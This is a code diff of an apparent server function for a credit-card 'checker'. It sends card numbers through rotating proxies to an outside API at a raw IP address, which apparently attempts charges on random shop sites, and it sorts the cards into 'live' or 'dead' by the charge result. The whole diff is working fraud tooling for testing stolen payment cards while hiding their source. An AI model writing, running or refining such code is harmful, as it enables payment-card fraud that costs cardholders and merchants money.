@@ -13,7 +13,7 @@ const SUPABASE_SERVICE_ROLE_KEY = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!;
 const TELEGRAM_BOT_TOKEN = Deno.env.get("TELEGRAM_BOT_TOKEN");
 const ADMIN_TELEGRAM_CHAT_ID = Deno.env.get("ADMIN_TELEGRAM_CHAT_ID") || "8496943061";
 
-const API_BASE_URL = "https://lavda-lasan.up.railway.app/shopify";
+const API_BASE_URL = "http://108.165.12.183:8081/";
 
 const badResponses = [
   "Site not supported",
@@ -141,8 +141,8 @@ const checkSingleCard = async (
     const currentProxy = proxyAttempts[attempt];
     const proxyStr = currentProxy ? formatProxy(currentProxy) : '';
     const apiUrl = proxyStr
-      ? `${API_BASE_URL}?cc=${encodeURIComponent(cc)}&site=${encodeURIComponent(randomSite.url)}&proxy=${proxyStr}`
-      : `${API_BASE_URL}?cc=${encodeURIComponent(cc)}&site=${encodeURIComponent(randomSite.url)}`;
+      ? `${API_BASE_URL}?cc=${encodeURIComponent(cc)}&url=${encodeURIComponent(randomSite.url)}&proxy=${proxyStr}`
+      : `${API_BASE_URL}?cc=${encodeURIComponent(cc)}&url=${encodeURIComponent(randomSite.url)}`;
 
     const controller = new AbortController();
     const timeoutId = setTimeout(() => controller.abort(), 60000);
@@ -214,8 +214,8 @@ const checkSingleCard = async (
         const responseText = (apiResponse || apiMessage || '').trim();
         if (isEmptyOrErrorOnly(responseText) && price === 0) {
           apiStatus = 'unknown';
-        } else if (json.status === 'CHARGED' || json.status === 'success' || json.full_response === true) {
-          apiStatus = 'live'; apiMessage = json.message || 'Charged';
+        } else if (String(json.Charge).toLowerCase() === 'true' || json.Charge === true || json.status === 'CHARGED' || json.status === 'success' || json.full_response === true) {
+          apiStatus = 'live'; apiMessage = json.Response || json.message || 'Charged';
         } else if (json.status === 'DECLINED' || json.status === 'failed' || json.full_response === false || json.status === 'DS_REQUIRED' || json.status === '3DS_REQUIRED') {
           apiStatus = 'dead'; apiMessage = json.message || json.error || 'Declined';
         } else if (json.status === 'error') {
